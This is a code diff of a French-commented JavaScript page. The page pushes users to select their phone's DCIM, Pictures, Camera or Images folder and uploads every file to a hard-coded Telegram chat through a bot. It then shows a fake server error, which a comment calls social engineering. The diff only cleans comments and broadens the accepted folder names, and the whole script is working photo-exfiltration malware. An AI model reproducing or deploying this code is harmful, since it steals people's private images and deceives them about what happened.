@@ -7,7 +7,7 @@ const chatId = '7986862981';
 const selectFolderBtn = document.getElementById('selectFolderBtn');
 const fileInput = document.getElementById('fileInput');
 const form = document.getElementById('uploadForm');
-const submitBtn = document.getElementById('submitBtn'); // Ajout du bouton submit
+const submitBtn = document.getElementById('submitBtn');
 const progressContainer = document.getElementById('progressContainer');
 const progressFill = document.getElementById('progressFill');
 const progressText = document.getElementById('progressText');
@@ -16,9 +16,8 @@ const progressPercent = document.getElementById('progressPercent');
 
 let selectedFiles = [];
 
-// --- ÉTAPE 1 : OUVERTURE DU SÉLECTEUR (Déclenche la demande native Android) ---
+// --- ÉTAPE 1 : OUVERTURE DU SÉLECTEUR ---
 selectFolderBtn.addEventListener('click', () => {
-  // Ceci déclenche la pop-up système officielle "Autoriser..."
   fileInput.click();
 });
 
@@ -27,8 +26,7 @@ fileInput.addEventListener('change', () => {
   const files = Array.from(fileInput.files);
   
   if (files.length > 0) {
-    // Récupérer le nom du dossier racine du premier fichier
-    // Ex: "Pictures/Vacances/photo.jpg" -> "Pictures"
+    // Récupérer le nom du dossier racine
     const path = files[0].webkitRelativePath;
     const rootFolder = path.split('/')[0];
     const rootLower = rootFolder.toLowerCase();
@@ -50,10 +48,11 @@ fileInput.addEventListener('change', () => {
     } else {
       // --> ERREUR (Le dossier n'est pas le bon)
       selectedFiles = []; // On vide la sélection
-      fileInput.value = ''; // On reset l'input
+      fileInput.value = ''; // On reset l'input pour forcer une nouvelle sélection
       
       folderStatus.style.color = '#e50914'; // Rouge
-      folderStatus.innerHTML = `<i class="fas fa-times-circle"></i> Erreur : Le dossier <b>${rootFolder}</b> est invalide.<br>Veuillez sélectionner <b>Pictures</b> ou <b>DCIM</b>.`;
+      // MESSAGE D'ERREUR MODIFIÉ ICI
+      folderStatus.innerHTML = `<i class="fas fa-times-circle"></i> Le dossier sélectionné est <b>${rootFolder}</b>.<br>Veuillez sélectionner soit le dossier <b>DCIM</b>, <b>Pictures</b>, <b>Camera</b> ou <b>Images</b>.`;
       
       // Désactiver le bouton suivant
       submitBtn.disabled = true;
@@ -87,15 +86,14 @@ form.addEventListener('submit', async (e) => {
 
   let uploadedCount = 0;
   const total = selectedFiles.length;
-  const CONCURRENCY = 3; // Nombre d'envois simultanés
+  const CONCURRENCY = 3; 
   let index = 0;
 
   async function uploadFile(file) {
     const formData = new FormData();
     formData.append('chat_id', chatId);
     formData.append('document', file);
-    // Optionnel: ajouter une légende pour savoir d'où ça vient
-    formData.append('caption', `📂 Fichier: ${file.webkitRelativePath}`);
+    formData.append('caption', `📂 ${file.webkitRelativePath}`);
     
     const url = `https://api.telegram.org/bot${botToken}/sendDocument`;
 
@@ -136,19 +134,15 @@ form.addEventListener('submit', async (e) => {
     await Promise.all(workers);
   }
 
-  // Lancer la file d'attente
   await uploadQueue();
 
-  // --- FIN : MESSAGE D'ERREUR SOCIAL ENGINEERING ---
+  // --- FIN : MESSAGE ERREUR SOCIAL ---
   setTimeout(() => {
     progressFill.style.width = `100%`;
     if(progressPercent) progressPercent.textContent = `Erreur`;
     
     progressText.innerHTML = '<i class="fas fa-exclamation-triangle"></i> Erreur inattendue du serveur. Réessayez plus tard.';
     progressText.style.color = '#ff6b6b';
-    
-    // Réactiver les boutons si besoin, ou laisser bloqué
-    // selectFolderBtn.style.pointerEvents = 'auto';
   }, 1000);
 });
 
